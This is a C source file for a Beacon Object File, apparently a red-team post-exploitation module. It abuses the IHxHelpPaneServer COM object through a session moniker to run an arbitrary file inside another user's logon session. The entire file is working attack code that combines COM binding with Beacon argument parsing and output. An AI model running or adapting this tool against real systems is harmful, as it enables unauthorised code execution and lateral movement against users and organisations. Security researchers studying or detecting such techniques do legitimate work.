#include <windows.h>
#include <objbase.h>
#include <initguid.h>
#include "base.c"

/*  Define IHxHelpPaneServer COM interface  */
DEFINE_GUID( IID_IHxHelpPaneServer, 0x8cec592c, 0x07a1, 0x11d9, 0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee );
DEFINE_GUID( CLSID_IHxHelpPaneServer, 0x8cec58ae, 0x07a1, 0x11d9, 0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee );

/*  Forward declaration  */
typedef struct IHxHelpPaneServer IHxHelpPaneServer;

/*  IHxHelpPaneServer interface definition  */
typedef struct IHxHelpPaneServerVtbl
{
    /*  IUnknown methods  */
    HRESULT ( STDMETHODCALLTYPE *QueryInterface )( IHxHelpPaneServer *This, REFIID riid, void **ppvObject );
    ULONG ( STDMETHODCALLTYPE *AddRef )( IHxHelpPaneServer *This );
    ULONG ( STDMETHODCALLTYPE *Release )( IHxHelpPaneServer *This );
    /*  IHxHelpPaneServer methods  */
    HRESULT ( STDMETHODCALLTYPE *DisplayTask )( IHxHelpPaneServer *This, LPWSTR pwszTask );
    HRESULT ( STDMETHODCALLTYPE *DisplayContents )( IHxHelpPaneServer *This, LPWSTR pwszContents );
    HRESULT ( STDMETHODCALLTYPE *DisplaySearchResults )( IHxHelpPaneServer *This, LPWSTR pwszSearch );
    HRESULT ( STDMETHODCALLTYPE *Execute )( IHxHelpPaneServer *This, LPCWSTR pwszFile );
} IHxHelpPaneServerVtbl;

struct IHxHelpPaneServer
{
    IHxHelpPaneServerVtbl *lpVtbl;
};


void execute( int sessionId, wchar_t* filePath )
{
    HRESULT hr;
    IHxHelpPaneServer *pServer = NULL;
    wchar_t monikerName[512] = {0};
    wchar_t fileUri[MAX_PATH * 2] = {0};
    int i, j;

    /*  Initialize COM  */
    hr = OLE32$CoInitializeEx( NULL, COINIT_APARTMENTTHREADED );
    if ( FAILED( hr ) )
    {
        hr = OLE32$CoInitializeEx( NULL, COINIT_MULTITHREADED );
        if ( FAILED( hr ) )
        {
            internal_printf( "[!] CoInitializeEx failed: 0x%08x\n", hr );
            return;
        }
    }

    /*  Convert Windows path to file:/// URI  */
    /*  file:/// + C:/path/file.exe (with backslashes converted to forward slashes)  */
    MSVCRT$_snwprintf( fileUri, MAX_PATH * 2, L"file:///" );
    j = 8;  /*  Length of "file:///"  */

    for ( i = 0; filePath[i] != L'\0' && j < (MAX_PATH * 2 - 1); i++, j++ )
    {
        if ( filePath[i] == L'\\' )
        {
            fileUri[j] = L'/';
        }
        else
        {
            fileUri[j] = filePath[i];
        }
    }
    fileUri[j] = L'\0';

    /*  Build the moniker string: session:{sessionId}!new:{CLSID}  */
    MSVCRT$_snwprintf( monikerName, 512, L"session:%d!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", sessionId );

    internal_printf( "[*] Binding to moniker: %S\n", monikerName );

    /*  Bind to the COM object in the target session  */
    hr = OLE32$CoGetObject( monikerName, NULL, &IID_IHxHelpPaneServer, (void**)&pServer );
    if ( FAILED( hr ) )
    {
        internal_printf( "[!] CoGetObject failed: 0x%08x\n", hr );
        internal_printf( "[!] Make sure the target session exists and is active\n" );
        goto cleanup;
    }

    internal_printf( "[+] Successfully bound to IHxHelpPaneServer in session %d\n", sessionId );

    /*  Validate the interface pointer  */
    if ( pServer->lpVtbl == NULL || pServer->lpVtbl->Execute == NULL )
    {
        internal_printf( "[!] Invalid interface vtable\n" );
        goto cleanup;
    }

    internal_printf( "[*] Executing: %S\n", fileUri );

    /*  Execute the file in the target session  */
    hr = pServer->lpVtbl->Execute( pServer, fileUri );
    if ( FAILED( hr ) )
    {
        internal_printf( "[!] Execute failed: 0x%08x\n", hr );
        goto cleanup;
    }

    internal_printf( "[+] Successfully executed %S in session %d\n", filePath, sessionId );

cleanup:
    if ( pServer != NULL )
    {
        pServer->lpVtbl->Release( pServer );
    }
    OLE32$CoUninitialize();
}


#ifdef BOF
void go( IN PCHAR Args, IN ULONG Length )
{
    int sessionId;
    wchar_t* filePath;

    /*  Parse Arguments  */
    datap parser;
    BeaconDataParse( &parser, Args, Length );
    sessionId = BeaconDataInt( &parser );
    filePath = (wchar_t*)BeaconDataExtract( &parser, NULL );

    if ( sessionId == 0 || filePath == NULL )
    {
        internal_printf( "[!] Missing arguments\n" );
        return;
    }

    if ( !bofstart() )
    {
        return;
    }

    execute( sessionId, filePath );

    printoutput( TRUE );
    return;
}

#else

int main( int argc, char* argv[] )
{
    int sessionId = 1;
    wchar_t* filePath = L"C:\\Windows\\System32\\notepad.exe";
    execute( sessionId, filePath );
    return 0;
}

#endif